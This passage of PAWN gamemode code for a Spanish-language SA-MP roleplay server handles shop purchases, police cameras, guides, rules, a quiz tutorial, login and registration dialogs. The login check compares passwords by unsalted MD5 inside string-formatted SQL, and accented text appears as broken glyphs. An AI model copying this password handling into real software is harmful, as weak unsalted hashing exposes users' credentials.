	TextDrawSetOutline(RegTDTitle, 1);
	TextDrawSetProportional(RegTDTitle, 1);
	
	TutTDBackground = TextDrawCreate(318.000000, 335.000000, "~n~~n~~n~~n~~n~~n~~n~~n~~n~");
	TextDrawAlignment(TutTDBackground, 2);
	TextDrawBackgroundColor(TutTDBackground, 255);
	TextDrawFont(TutTDBackground, 1);
	TextDrawLetterSize(TutTDBackground, 0.500000, 1.000000);
	TextDrawColor(TutTDBackground, -1);
	TextDrawSetOutline(TutTDBackground, 0);
	TextDrawSetProportional(TutTDBackground, 1);
	TextDrawSetShadow(TutTDBackground, 1);
	TextDrawUseBox(TutTDBackground, 1);
	TextDrawBoxColor(TutTDBackground, 120);
	TextDrawTextSize(TutTDBackground, 70.000000, -607.000000);
	return 1;
}


public restartTimer(type) {
	iGMXTick--;
	new string[128];
    if(type == 0) {
        format(string, sizeof(string), "reiniciando");
    } else {
        format(string, sizeof(string), "apagando");
    }
	if(iGMXTick == 0) {
	   	if(type == 0) {
			SendClientMessageToAll(COLOR_LIGHTRED, "{FFFFFF}El servidor se est� reiniciando.");
			SendRconCommand("gmx");
	    } else {
  			SendClientMessageToAll(COLOR_LIGHTRED, "{FFFFFF}El servidor se est� apagando.");
			SendRconCommand("exit");
	    }
	    KillTimer(timersID[9]);
	}
 	format(string, sizeof(string), "~w~%s servidor en...~n~ ~r~ %d ~w~ segundo/s.", string, iGMXTick); GameTextForAll(string, 1110, 5);
	return 1;
}

stock split2(const strsrc[], strdest[][], delimiter) {
    new i, li;
    new aNum;
    new len;
    while(i <= strlen(strsrc)) {
        if(strsrc[i] == delimiter || i == strlen(strsrc)) {
            len = strmid(strdest[aNum], strsrc, li, i, 128);
            strdest[aNum][len] = 0;
            li = i+1;
            aNum++;
        }
        i++;
    }
    return 1;
}

public OnPlayerUpdate(playerid) {
	return 1;
}

public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[]) {

	if(!isnull(inputtext))
		for(new strPos; inputtext[strPos] > 0; strPos++)
			if(inputtext[strPos] == '%')
				inputtext[strPos] = '\0'; // SA-MP placeholder exploit patch

	switch(dialogid)
	{
		case DLG_CAMARAS_POLICIA:
        {
        	if(response)
          	{
           		TogglePlayerControllable(playerid, false);
                usingCamera[playerid] = true;
                SendClientMessage(playerid, COLOR_WHITE, "Te encuentras mirando una camara de seguridad. Para salir utiliza /salircam.");
	         	switch(listitem)
				{
    				case 0:
	   				{
                        SetPlayerCameraPos(playerid,1810.6332,-1881.8149,19.5813);
                        SetPlayerCameraLookAt(playerid,1826.7717,-1855.4510,13.5781);
                        SetPlayerInterior(playerid, 0);
						SetPlayerPos(playerid, 1808.0325, -1875.4358, 14.1098);
	                }
	                case 1:
	                {
                        SetPlayerCameraPos(playerid,1597.0785,-1881.5038,27.7953);
                        SetPlayerCameraLookAt(playerid,1622.404,-1867.609,13.167);
                        SetPlayerInterior(playerid, 0);
                        SetPlayerPos(playerid, 1625.4521, -1869.5902, 8.3828);
	                }
	                case 2:
	                {
                        SetPlayerCameraPos(playerid, 1176.9811,-1343.1915,19.4488);
                        SetPlayerCameraLookAt(playerid,1189.4771,-1324.0830,13.5669);
                        SetPlayerInterior(playerid, 0);
                        SetPlayerPos(playerid, 1194.1521, -1325.6360, 9.3984);
	                }
	                case 3:
	                {
                        SetPlayerCameraPos(playerid,493.8351,-1271.0554,31.1417);
                        SetPlayerCameraLookAt(playerid,536.0699,-1266.2397,16.5363);
                        SetPlayerInterior(playerid, 0);
                        SetPlayerPos(playerid, 541.5012, -1257.4186, 10.5401);
	                }
	                case 4:
	                {
                        SetPlayerCameraPos(playerid,807.4939,-1307.5045,28.8984);
                        SetPlayerCameraLookAt(playerid,783.412,-1327.025,13.254);
                        SetPlayerInterior(playerid, 0);
                        SetPlayerPos(playerid, 778.0953, -1323.9830, 9.3906);
	                }
	                case 5:
	                {
                        SetPlayerCameraPos(playerid,1289.1920,-944.2938,59.1594);
                        SetPlayerCameraLookAt(playerid,1316.086,-914.297,37.690);
                        SetPlayerInterior(playerid, 0);
                        SetPlayerPos(playerid, 1315.8170, -915.3012, 32.0215);
	                }
	                case 6:
	                {
                        SetPlayerCameraPos(playerid, 1354.3875,-1725.0841,23.1490);
                        SetPlayerCameraLookAt(playerid, 1352.600,-1740.055,13.171);
                        SetPlayerInterior(playerid, 0);
                        SetPlayerPos(playerid, 1366.0573, -1754.3422, 14.0174);
	                }
	                case 7:
	                {
                        SetPlayerCameraPos(playerid,2352.8774,-1249.7654,36.8919);
                        SetPlayerCameraLookAt(playerid, 2374.472,-1211.521,27.135);
                        SetPlayerInterior(playerid, 0);
                        SetPlayerPos(playerid, 2348.5415, -1210.8560, 30.2480);
	               	}
					case 8:
	                {
                        SetPlayerCameraPos(playerid,1430.0485,-1151.9353,36.8923);
                        SetPlayerCameraLookAt(playerid, 1465.9761,-1172.3713,23.8700);
                        SetPlayerInterior(playerid, 0);
                        SetPlayerPos(playerid, 1466.8362, -1172.6542, 15.9016);
	               	}
					case 9:
	                {
                        SetPlayerCameraPos(playerid,1542.1896,-1714.8029,28.7414);
                        SetPlayerCameraLookAt(playerid, 1507.4358,-1736.1678,13.3828);
                        SetPlayerInterior(playerid, 0);
                        SetPlayerPos(playerid, 1512.8125, -1736.2164, 5.3828);
	               	}
            	}
   			}
        	return 1;
      	}
        case DLG_247:
		{
            new business = GetPlayerBusiness(playerid);
            TogglePlayerControllable(playerid, true);
            if(response)
			{
				switch(listitem)
				{
					case 0:
					{
				        if(GetPlayerCash(playerid) < PRICE_ASPIRIN)
							return SendClientMessage(playerid, COLOR_YELLOW2, "No tienes el dinero necesario.");
 						PlayerActionMessage(playerid, 15.0, "le paga al empleado por una aspirina.");
						SendFMessage(playerid, COLOR_WHITE, "�Has comprado una aspirina $%d!", PRICE_ASPIRIN);
                        new Float:health;
						GetPlayerHealthEx(playerid, health);
						if(health > 50.0) // Solo para curar heridas menores
						{
							if(health + HEALTH_ASPIRIN > 100)
	      						SetPlayerHealthEx(playerid, 100);
	      					else
	           					SetPlayerHealthEx(playerid, health + HEALTH_ASPIRIN);
						} else
						    SendClientMessage(playerid, COLOR_YELLOW2, "La aspirina no ha sido de mucha ayuda debido a que tus heridas son graves. V� al hospital.");
						GivePlayerCash(playerid, -PRICE_ASPIRIN);
		   				Business[business][bTill] += PRICE_ASPIRIN;
			        	Business[business][bProducts]--;
			        	saveBusiness(business);
					}
			        case 1:
					{
				        if(GetPlayerCash(playerid) < PRICE_CIGARETTES)
				            return SendClientMessage(playerid, COLOR_YELLOW2, "No tienes el dinero necesario.");
            			if(PlayerInfo[playerid][pCigarettes] > 20)
               				return SendClientMessage(playerid, COLOR_YELLOW2, "Tienes demasiados cigarrillos.");
						GivePlayerCash(playerid, -PRICE_CIGARETTES);
						PlayerActionMessage(playerid, 15.0, "le paga al empleado por un atado de cigarrilos y se lo guarda en el bolsillo.");
						SendFMessage(playerid, COLOR_WHITE, "Has comprado un atado de cigarrillos (20 unidades) por $%d, puedes utilizar /fumar.", PRICE_CIGARETTES);
						PlayerInfo[playerid][pCigarettes] += 20;
						Business[business][bTill] += PRICE_CIGARETTES;
				        Business[business][bProducts]--;
				        saveBusiness(business);
			        }
			        case 2:
					{
				        if(GetPlayerCash(playerid) < PRICE_LIGHTER)
							return SendClientMessage(playerid, COLOR_YELLOW2, "No tienes el dinero necesario.");
       					if(PlayerInfo[playerid][pLighter])
            				return SendClientMessage(playerid, COLOR_YELLOW2, "Ya tienes un encendedor.");
						GivePlayerCash(playerid, -PRICE_LIGHTER);
						PlayerActionMessage(playerid, 15.0, "le paga al empleado por un encendedor y se lo guarda en el bolsillo.");
						SendFMessage(playerid, COLOR_WHITE, "�Has comprado un encendedor por $%d!", PRICE_LIGHTER);
						PlayerInfo[playerid][pLighter] = 1;
		   				Business[business][bTill] += PRICE_LIGHTER;
	        			Business[business][bProducts]--;
	        			saveBusiness(business);
			        }
					case 3:
					{
						if(GetPlayerCash(playerid) < PRICE_PHONE)
							return SendClientMessage(playerid, COLOR_YELLOW2, "�No tienes el dinero suficiente!");
						GivePlayerCash(playerid, -PRICE_PHONE);
						PlayerActionMessage(playerid, 15.0, "toma dinero de su bolsillo, le paga al empleado y recibe un tel�fono a cambio.");
						SendFMessage(playerid, COLOR_WHITE, "�Felicidades! has comprado un tel�fono celular ($%d) utiliza /ayuda para ver los comandos disponibles.", PRICE_PHONE);
						PlayerInfo[playerid][pPhoneNumber] = 1500000000 + random(99999999);
						PlayerInfo[playerid][pPhoneC] = 0;
						PlayerInfo[playerid][pListNumber] = 1;
						Business[business][bTill] += PRICE_PHONE;
			        	Business[business][bProducts]--;
        				saveBusiness(business);
					}
			        case 4:
					{
				        if(GetPlayerCash(playerid) < GetItemPrice(ITEM_ID_BIDON))
							return SendClientMessage(playerid, COLOR_YELLOW2, "No tienes el dinero necesario.");
						new freehand = SearchFreeHand(playerid);
						if(freehand == -1)
							return SendClientMessage(playerid, COLOR_YELLOW2, "No tienes c�mo agarrar el item ya que tienes ambas manos ocupadas.");

						SetHandItemAndParam(playerid, freehand, ITEM_ID_BIDON, 0);
						GivePlayerCash(playerid, -GetItemPrice(ITEM_ID_BIDON));
						PlayerActionMessage(playerid, 15.0, "le paga al empleado por un bid�n de combustible.");
						SendFMessage(playerid, COLOR_WHITE, "Has comprado un bid�n por $%d, utiliza '/bidon' para m�s informaci�n.", GetItemPrice(ITEM_ID_BIDON));
		   				Business[business][bTill] += GetItemPrice(ITEM_ID_BIDON);
        				Business[business][bProducts]--;
				        saveBusiness(business);
			        }
			     	case 5:
					 {
				        if(GetPlayerCash(playerid) < GetItemPrice(ITEM_ID_CAMARA) * 35)
							return SendClientMessage(playerid, COLOR_YELLOW2, "No tienes el dinero necesario.");
						if(!GivePlayerGun(playerid, ITEM_ID_CAMARA, 35))
							return SendClientMessage(playerid, COLOR_YELLOW2, "No tienes c�mo agarrar el item ya que tienes ambas manos ocupadas.");
							
						GivePlayerCash(playerid, -GetItemPrice(ITEM_ID_CAMARA) * 35);
						PlayerActionMessage(playerid, 15.0, "le paga al empleado por una c�mara fotogr�fica.");
						SendFMessage(playerid, COLOR_WHITE, "Has comprado una c�mara fotogr�fica por $%d.", GetItemPrice(ITEM_ID_CAMARA)*35);
 						Business[business][bTill] += GetItemPrice(ITEM_ID_CAMARA) * 35;
        				Business[business][bProducts]--;
				        saveBusiness(business);
			        }
			        case 6:
					{
				        if(GetPlayerCash(playerid) < GetItemPrice(ITEM_ID_SANDWICH))
							return SendClientMessage(playerid, COLOR_YELLOW2, "No tienes el dinero necesario.");
						new freehand = SearchFreeHand(playerid);
						if(freehand == -1)
							return SendClientMessage(playerid, COLOR_YELLOW2, "No tienes c�mo agarrar el item ya que tienes ambas manos ocupadas.");

						SetHandItemAndParam(playerid, freehand, ITEM_ID_SANDWICH, 1);
						GivePlayerCash(playerid, -GetItemPrice(ITEM_ID_SANDWICH));
						PlayerActionMessage(playerid, 15.0, "agarra un s�ndwich de jam�n y queso y le paga al empleado su precio.");
						SendFMessage(playerid, COLOR_WHITE, "�Has comprado un s�ndwich por $%d. Lo tienes en tus manos!", GetItemPrice(ITEM_ID_SANDWICH));
		   				Business[business][bTill] += GetItemPrice(ITEM_ID_SANDWICH);
			        	Business[business][bProducts]--;
			        	saveBusiness(business);
					}
					case 7:
					{
				        if(GetPlayerCash(playerid) < GetItemPrice(ITEM_ID_AGUAMINERAL))
							return SendClientMessage(playerid, COLOR_YELLOW2, "No tienes el dinero necesario.");
						new freehand = SearchFreeHand(playerid);
						if(freehand == -1)
							return SendClientMessage(playerid, COLOR_YELLOW2, "No tienes c�mo agarrar el item ya que tienes ambas manos ocupadas.");

						SetHandItemAndParam(playerid, freehand, ITEM_ID_AGUAMINERAL, 1);
						GivePlayerCash(playerid, -GetItemPrice(ITEM_ID_AGUAMINERAL));
						PlayerActionMessage(playerid, 15.0, "le paga al empleado por un agua mineral.");
						SendFMessage(playerid, COLOR_WHITE, "�Has comprado una botella de agua por $%d. La tienes en tus manos!", GetItemPrice(ITEM_ID_AGUAMINERAL));
		   				Business[business][bTill] += GetItemPrice(ITEM_ID_AGUAMINERAL);
			        	Business[business][bProducts]--;
			        	saveBusiness(business);
					}
					case 8:
					{
				        if(GetPlayerCash(playerid) < GetItemPrice(ITEM_ID_MALETIN))
							return SendClientMessage(playerid, COLOR_YELLOW2, "No tienes el dinero necesario.");
 						new freehand = SearchFreeHand(playerid);
						if(freehand == -1)
							return SendClientMessage(playerid, COLOR_YELLOW2, "No tienes c�mo agarrar el item ya que tienes ambas manos ocupadas.");

						SetHandItemAndParam(playerid, freehand, ITEM_ID_MALETIN, 0);
						GivePlayerCash(playerid, -GetItemPrice(ITEM_ID_MALETIN));
						PlayerActionMessage(playerid, 15.0, "le paga al empleado por un maletin y lo agarra con su mano.");
						SendFMessage(playerid, COLOR_WHITE, "�Has comprado un maletin por $%d! Lo tienes en la mano. Usa /maletin para m�s informaci�n.", GetItemPrice(ITEM_ID_MALETIN));
		   				Business[business][bTill] += GetItemPrice(ITEM_ID_MALETIN);
			        	Business[business][bProducts]--;
			        	saveBusiness(business);
					}
					case 9:
					{
				        if(GetPlayerCash(playerid) < PRICE_RADIO)
							return SendClientMessage(playerid, COLOR_YELLOW2, "No tienes el dinero necesario.");
						if(PlayerInfo[playerid][pRadio] != 0)
						    return SendClientMessage(playerid, COLOR_YELLOW2, "�Ya tienes una radio!");
						GivePlayerCash(playerid, -PRICE_RADIO);
						PlayerInfo[playerid][pRadio] = 1;
						PlayerActionMessage(playerid, 15.0, "le paga al empleado por un radio walkie talkie.");
						SendFMessage(playerid, COLOR_WHITE, "�Has comprado un radio walkie talkie por $%d!", PRICE_RADIO);
		   				Business[business][bTill] += PRICE_RADIO;
			        	Business[business][bProducts]--;
			        	saveBusiness(business);
					}
					
				}
			}
			return 1;
        }
        case DLG_BIZ_ACCESS:
        {
            if(response)
            	OnPlayerBuyAccessDialog(playerid, listitem);
            TogglePlayerControllable(playerid, true);
            return 1;
		}
        case DLG_BIZ_HARD:
        {
            if(response)
            	OnPlayerBuyHardDialog(playerid, listitem);
            TogglePlayerControllable(playerid, true);
            return 1;
		}
		case DLG_DYING:
		{
			if(response)
			{
			    new Float:playerPos[3];
				GetPlayerPos(playerid, playerPos[0], playerPos[1], playerPos[2]);
				foreach(new i : Player)
				{
			       	if(PlayerInfo[i][pFaction] == FAC_HOSP)
					{
					    SendClientMessage(i, COLOR_WHITE, "[Hospital]: �Atenci�n! Hemos marcado en su GPS la ubicaci�n de una llamada de emergencia que requiere asistencia.");
			            SetPlayerCheckpoint(i, playerPos[0], playerPos[1], playerPos[2], 3.0);
					}
					else if(isPlayerCopOnDuty(i))
					{
			       		SendClientMessage(i, COLOR_PMA, "[Llamado al 911]: �Atenci�n! Un ciudadano ha reportado a un herido de gravedad. Lo marcamos en su GPS.");
						SetPlayerCheckpoint(i, playerPos[0], playerPos[1], playerPos[2], 3.0);
					}
				}
				SendClientMessage(playerid, COLOR_YELLOW2, "�Un ciudadano not� tu agon�a y ha reportado tu situacion al 911!");
			} else
			    SendClientMessage(playerid, COLOR_YELLOW2, "Desafortunadamente nadie ha notado tu agon�a.");
			return 1;
		}
		case DLG_NOTEBOOK:
		{
		    OnNotebookDialogResponse(playerid, response, listitem);
		    return 1;
		}
		case DLG_NOTEBOOK_2:
		{
		    OnNotebook2DialogResponse(playerid, response, listitem);
		    return 1;
		}
		case DLG_NOTEBOOK_3:
		{
		    OnNotebook3DialogResponse(playerid, response, inputtext);
		    return 1;
		}
		case DLG_CARDEALER1:
		{
		    OnCarDealerDialogResponse(playerid, response, listitem);
		    return 1;
		}
		case DLG_CARDEALER2:
		{
		    OnCarDealer2DialogResponse(playerid, response, inputtext);
		    return 1;
		}
		case DLG_CARDEALER3:
		{
      		OnCarDealer3DialogResponse(playerid, response, inputtext);
		    return 1;
		}
		case DLG_CARDEALER4:
		{
		    OnCarDealer4DialogResponse(playerid, response);
		    return 1;
		}
	    case DLG_GUIDE: {
	        if(response) {
			     switch(listitem) {
				   	case 0: {
		   				SendClientMessage(playerid, COLOR_WHITE, "Gu�a: para rentar un veh�culo, v� al lugar marcado con rojo en el mapa o a alguna agencia de renta.");
		                SetPlayerCheckpoint(playerid, 1568.4810, -2253.9084, 13.5425, 5.0);
		   			}
		   			case 1: {
		   				SendClientMessage(playerid, COLOR_WHITE, "Gu�a: puedes tomar la prueba de conducci�n en la localizaci�n marcada con rojo en el mapa.");
		                SetPlayerCheckpoint(playerid, 1153.9204, -1771.8287, 16.5992, 5.0);
		   			}
		   			case 2: {
		   				SendClientMessage(playerid, COLOR_WHITE, "Gu�a: el centro de empleos se encuentra en la localizaci�n marcada con rojo en el mapa.");
		                SetPlayerCheckpoint(playerid, 1480.9441, -1771.7863, 18.7958, 5.0);
		   			}
		   			case 3: {
		   				SendClientMessage(playerid, COLOR_WHITE, "Gu�a: la tienda de ropa se encuentra en la localizaci�n marcada con rojo en el mapa.");
		                SetPlayerCheckpoint(playerid, 2244.7151, -1664.2365, 15.4766, 5.0);
		   			}
		   			case 4: {
		   				SendClientMessage(playerid, COLOR_WHITE, "Gu�a: la tienda de ropa se encuentra en la localizaci�n marcada con rojo en el mapa.");
		                SetPlayerCheckpoint(playerid, 461.3749, -1500.8853, 31.0594, 5.0);
		   			}
		   			case 5: {
						SendClientMessage(playerid, COLOR_WHITE, "Gu�a: el Mercado de Malos Aires se encuentra en la localizaci�n marcada con rojo en el mapa.");
						SetPlayerCheckpoint(playerid, 1132.9373, -1410.2246, 13.4747, 5.0);
					}
				}
	        }
	        TogglePlayerControllable(playerid, true);
		    return 1;
	    }
		case DLG_JOBS: {
		    if(response) {
		    	switch(listitem) {
			   		case 0: {
			   		    SendClientMessage(playerid, COLOR_WHITE, "Asistente dice: puedes tomar el empleo si te diriges a la siguiente localizaci�n.");
		                PlayerActionMessage(playerid, 15.0, "recibe un mapa por parte de la asistente con una localizaci�n marcada en rojo.");
		                SetPlayerCheckpoint(playerid, 1621.6262, -1863.1412, 13.5469, 5.0);
			   		}
			   		case 1: {
			   		    SendClientMessage(playerid, COLOR_WHITE, "Asistente dice: v� a la siguiente localizaci�n, probablemente deber�s realizar ciertas pruebas y desde luego necesitar�s una licencia de conducci�n.");
		                PlayerActionMessage(playerid, 15.0, "recibe un mapa por parte de la asistente con una localizaci�n marcada en rojo.");
		                SetPlayerCheckpoint(playerid, JobInfo[JOB_TAXI][jTakeX], JobInfo[JOB_TAXI][jTakeY], JobInfo[JOB_TAXI][jTakeZ], 5.0);
			   		}
			   		case 2: {
			   		    SendClientMessage(playerid, COLOR_WHITE, "Asistente dice: puedes tomar el empleo si te diriges a la siguiente localizaci�n.");
		                PlayerActionMessage(playerid, 15.0, "recibe un mapa por parte de la asistente con una localizaci�n marcada en rojo.");
		                SetPlayerCheckpoint(playerid, JobInfo[JOB_FARM][jTakeX], JobInfo[JOB_FARM][jTakeY], JobInfo[JOB_FARM][jTakeZ], 5.0);
			   		}
			   		case 3: {
			   		    SendClientMessage(playerid, COLOR_WHITE, "Asistente dice: puedes tomar el empleo si te diriges a la siguiente localizaci�n.");
		                PlayerActionMessage(playerid, 15.0, "recibe un mapa por parte de la asistente con una localizaci�n marcada en rojo.");
		                SetPlayerCheckpoint(playerid, JobInfo[JOB_TRAN][jTakeX], JobInfo[JOB_TRAN][jTakeY], JobInfo[JOB_TRAN][jTakeZ], 5.0);
			   		}
		  			case 4: {
			   		    SendClientMessage(playerid, COLOR_WHITE, "Asistente dice: puedes tomar el empleo si te diriges a la siguiente localizaci�n.");
		                PlayerActionMessage(playerid, 15.0, "recibe un mapa por parte de la asistente con una localizaci�n marcada en rojo.");
		                SetPlayerCheckpoint(playerid, JobInfo[JOB_GARB][jTakeX], JobInfo[JOB_GARB][jTakeY], JobInfo[JOB_GARB][jTakeZ], 5.0);
			   		}
				}
		    }
			TogglePlayerControllable(playerid, true);
		    return 1;
		}
		case DLG_RULES: {
		    if(response) {
				if(listitem == 0) { ShowPlayerDialog(playerid,DLG_RULESMSG,DIALOG_STYLE_MSGBOX,"Terminos de RP - DM","DeathMatch:\nMatar a un jugador sin razon, sin motivo de rol.\nPegarle a alguien porque si.\nSi haces DM ser�s sancionado por un administrador.","Aceptar","Cancelar"); }
				else if(listitem == 1) { ShowPlayerDialog(playerid,DLG_RULESMSG,DIALOG_STYLE_MSGBOX,"Terminos de RP - PG","PowerGaming:\nHacer cosas que en la vida real no puedes hacer.\nEl PG es sancionado.","Aceptar","Cancelar"); }
				else if(listitem == 2) { ShowPlayerDialog(playerid,DLG_RULESMSG,DIALOG_STYLE_MSGBOX,"Terminos de RP - CJ","CarJacking:\nRobar un auto sin un rol previo.\nSubirse al auto de otro sin rolear el intento de robo.\n Si haces CJ ser�s sancionado por un administrador.","Aceptar","Cancelar"); }
				else if(listitem == 3) { ShowPlayerDialog(playerid,DLG_RULESMSG,DIALOG_STYLE_MSGBOX,"Terminos de RP - MG","MetaGaming:\nUsar informacion OOC dentro del rol (IC).\nEjemplo: Preguntar a un user donde esta por /w.\nLlamar a alguien por su nombre cuando IC no lo conocemos.\n El MG es sancionado.","Aceptar","Cancelar"); }
				else if(listitem == 4) { ShowPlayerDialog(playerid,DLG_RULESMSG,DIALOG_STYLE_MSGBOX,"Terminos de RP - RK","RevengeKill:\nVengarte de que te mataron matando al usuario que te mato.\nEsto no esta permitido ya que cuando mueres\npierdes la memoria.","Aceptar","Cancelar"); }
				else if(listitem == 5) { ShowPlayerDialog(playerid,DLG_RULESMSG,DIALOG_STYLE_MSGBOX,"Terminos de RP - BH","BunnyHop:\nSaltar abusivamente con el personaje o con la bicicleta.\nEsto no esta permitido y seras sancionado si lo haces.","Aceptar","Cancelar"); }
				else if(listitem == 6) { ShowPlayerDialog(playerid,DLG_RULESMSG,DIALOG_STYLE_MSGBOX,"Terminos de RP - VK","VehicleKill:\n Usar el auto para atropellar a un sujeto repetitivas veces hasta dejarlo desangrado o para matarlo.\nEsto no esta permitido y seras sancionado si lo haces.","Aceptar","Cancelar"); }
				else if(listitem == 7) { ShowPlayerDialog(playerid,DLG_RULESMSG,DIALOG_STYLE_MSGBOX,"Terminos de RP - ZZ","ZigZag:\nMoverte de un lado al otro para esquivar las balas.\nEs considerado PowerGaming.\nSeras sancionado si lo haces.","Aceptar","Cancelar"); }
				else if(listitem == 8) { ShowPlayerDialog(playerid,DLG_RULESMSG,DIALOG_STYLE_MSGBOX,"Terminos de RP - HK","HeliKill:\nUsar las haspas del helicoptero para matar a alguien.\nSi lo haces seras sancionado.","Aceptar","Cancelar"); }
				else if(listitem == 9) { ShowPlayerDialog(playerid,DLG_RULESMSG,DIALOG_STYLE_MSGBOX,"Terminos de RP - DB","DriveBy:\nDisparar estando como conductor de un auto o una moto.\nSi lo haces seras sancionado.","Aceptar","Cancelar"); }
				else if(listitem == 10) { ShowPlayerDialog(playerid,DLG_RULESMSG,DIALOG_STYLE_MSGBOX,"Terminos de RP - OOC","OutOfCharacter:\nSignifica afuera del personaje, cosas que no tienen nada que ver\ncon el rol de Malos Aires y de tu personaje.","Aceptar","Cancelar"); }
				else if(listitem == 11) { ShowPlayerDialog(playerid,DLG_RULESMSG,DIALOG_STYLE_MSGBOX,"Terminos de RP - IC","InCharacter:\nSignifica dentro del personaje, cosas que tienen que ver con el rol de\nMalos Aires y el de tu personaje.","Aceptar","Cancelar"); }
				else if(listitem == 12) { ShowPlayerDialog(playerid,DLG_RULESMSG,DIALOG_STYLE_MSGBOX,"Comandos - /ME","/ME:\nPara describir acciones de tu personaje. Por ejemplo:\n/me se rasca la cabeza.\n/me saca unos auriculares de su bolsillo.","Aceptar","Cancelar"); }
				else if(listitem == 13) { ShowPlayerDialog(playerid,DLG_RULESMSG,DIALOG_STYLE_MSGBOX,"Comandos - /DO","/DO:\nPara describir acciones del ambiente, en tercera persona. Por ejemplo:\n/do Se escucha a un gallo cacarear.\n/do Hay una mancha de sangre en el piso.","Aceptar","Cancelar"); }
				//else if(listitem == 14) { ShowPlayerDialog(playerid,DLG_RULESMSG,DIALOG_STYLE_MSGBOX,"Comandos - /INTENTAR","/INTENTAR:\nPara poder realizar una accion que tal vez puede fallar. Por ejemplo:\n/intentar sacar al sujeto del auto.\nSolo se puede hacer un /intentar cada 1 minuto.","Aceptar","Cancelar"); }
			}
			return 1;
		}
		case DLG_FIRST_LOGIN:
		{
	        if(response)
			{
			    if(gPlayerLogged[playerid] == 0)
			    {
			    	if(strlen(inputtext) < 6 || strlen(inputtext) > 16)
			    	{
					    KickPlayer(playerid, "el sistema", "contrase�a de registro muy corta o muy larga");
					    return 0;
					}
					
			        new query[256],
			            name[MAX_PLAYER_NAME],
			            password[32];

					GetPlayerName(playerid, name, MAX_PLAYER_NAME);
					
					strmid(password, inputtext, 0, strlen(inputtext), 32);
				    mysql_real_escape_string(password, password, 1, sizeof(password));

				    format(query, sizeof(query), "SELECT * FROM `accounts` WHERE UCASE(`Name`) = UCASE('%s') AND `Password` = MD5('%s')", name, password);
					mysql_function_query(dbHandle, query, true, "OnPlayerFirstLogin", "i", playerid);
			    }
			}
			else
			{
			    KickPlayer(playerid, "el sistema", "evadir inicio de sesi�n");
			    return 0;
			}
	        return 1;
	    }
		case DLG_LOGIN: {
	        if(!response) {
			    KickPlayer(playerid, "el sistema", "evadir inicio de sesi�n");
			    return 0;
			} else if(gPlayerLogged[playerid] == 0) {
				OnPlayerLogin(playerid, inputtext);
			}
	        return 1;
	    }
	    case DLG_REGISTER:
		{
		    if(!response)
			{
			    KickPlayer(playerid, "el sistema", "evadir registro");
			    return 0;
			}
			else if(gPlayerLogged[playerid] == 0)
			{
			    if(strlen(inputtext) < 6 || strlen(inputtext) > 16)
			    	ShowPlayerDialog(playerid, DLG_REGISTER, DIALOG_STYLE_PASSWORD, "�Ultimo paso!", "Para terminar de registrar tu cuenta, ingresa la contrase�a definitiva que solo tu conocer�s: \r\n{BE0000}- Debe tener al menos 6 caracteres y no mas de 16.", "Registar", "");
				else
					OnPlayerRegister(playerid, inputtext);
			}
	        return 1;
		}
		case DLG_TUT1: {
			if(!response) {
			    KickPlayer(playerid, "el sistema", "evadir tutorial");
			    return 0;
			} else if(listitem == 0 || listitem == 4) {
				ShowPlayerDialog(playerid, DLG_TUT2, DIALOG_STYLE_LIST, "Escoge una raz�n rolera para asesinar a otro personaje", "Te ha insultado por /b\nTe ha amenazado por /gritar\nNo ha cumple con las normas del servidor\nNo sabe jugar\nTe debe dinero y no te lo paga", "Siguiente", "");
            } else {
                tutorial(playerid, 1);
            }
		}
		case DLG_TUT2: {
			if(!response) {
			    KickPlayer(playerid, "el sistema", "evadir tutorial");
			    return 0;
			} else if(listitem == 1 || listitem == 4) {
				ShowPlayerDialog(playerid, DLG_TUT3, DIALOG_STYLE_LIST, "�Como reaccionas ante un robo a mano armada?", "Le robo el arma\nMe quedo quieto y levanto las manos\nEntro en shock\nLe trato de pegar\nLo reporto ante un moderador", "Siguiente", "");
            } else {
                tutorial(playerid, 1);
            }
		}
		case DLG_TUT3: {
			if(!response) {
			    KickPlayer(playerid, "el sistema", "evadir tutorial");
			    return 0;
			} else if(listitem == 1 || listitem == 2) {
				ShowPlayerDialog(playerid, DLG_TUT4, DIALOG_STYLE_LIST, "�Como reaccionas ante alguien que incumple las reglas?", "Le pego y lo reporto aun moderador\nLo reporto y cancelo el rol\nLo reporto y contin�o roleando\nLe disparo con un arma hasta matarlo\nNo hago nada", "Siguiente", "");
            } else {
                tutorial(playerid, 1);
            }
		}
		case DLG_TUT4: {
			if(!response) {
			    KickPlayer(playerid, "el sistema", "evadir tutorial");
			    return 0;
			} else if(listitem == 2) {
				ShowPlayerDialog(playerid, DLG_TUT5, DIALOG_STYLE_LIST, "�D�nde debes sugerir, opinar o reportar un bug (error del juego)?", "Por /mp a un scripter\nMediante el foro\nPor /duda\nPor MP a un scripter", "Siguiente", "");
            } else {
                tutorial(playerid, 1);
            }
		}
		case DLG_TUT5: {
			if(!response) {
			    KickPlayer(playerid, "el sistema", "evadir tutorial");
			    return 0;
			} else if(listitem == 1 || listitem == 3) {
			    StopAudioStreamForPlayer(playerid);
				PlayerInfo[playerid][pTutorial] = 1;
				if(PlayerInfo[playerid][pRegStep] != 0) {
					TextDrawShowForPlayer(playerid, RegTDBorder1);
					TextDrawShowForPlayer(playerid, RegTDBorder2);
					TextDrawShowForPlayer(playerid, RegTDTitle);
					TextDrawShowForPlayer(playerid, RegTDBackground);
					PlayerTextDrawShow(playerid, RegTDGender[playerid]);
					PlayerTextDrawShow(playerid, RegTDSkin[playerid]);
					PlayerTextDrawShow(playerid, RegTDAge[playerid]);
					PlayerTextDrawShow(playerid, RegTDOrigin[playerid]);

					PlayerInfo[playerid][pSex] = 1;
					PlayerInfo[playerid][pSkin] = SkinRegMale[0][0];
					PlayerInfo[playerid][pRegStep] = 1;

					SetPlayerInterior(playerid, 14);
			     	SetPlayerVirtualWorld(playerid, random(100000) + 44000);

					SendClientMessage(playerid, COLOR_LIGHTYELLOW2, "Presiona ~k~~PED_SPRINT~ para seleccionar una opci�n, ~k~~VEHICLE_ENTER_EXIT~ para finalizar.");
					SetSpawnInfo(playerid, 0, SkinRegMale[0][0], -1828.2881, -30.3119, 1061.1436, 182.0051, 0, 0, 0, 0, 0, 0);
				} else {
					SetSpawnInfo(playerid, 0, PlayerInfo[playerid][pSkin], PlayerInfo[playerid][pX], PlayerInfo[playerid][pY], PlayerInfo[playerid][pZ], PlayerInfo[playerid][pA], 0, 0, 0, 0, 0, 0);
				}
				TogglePlayerSpectating(playerid, false);
            } else {
                tutorial(playerid, 1);
            }
		}

//=========================SISTEMA DE TUNING DE MECANICOS=======================

		case DLG_TUNING:
		{
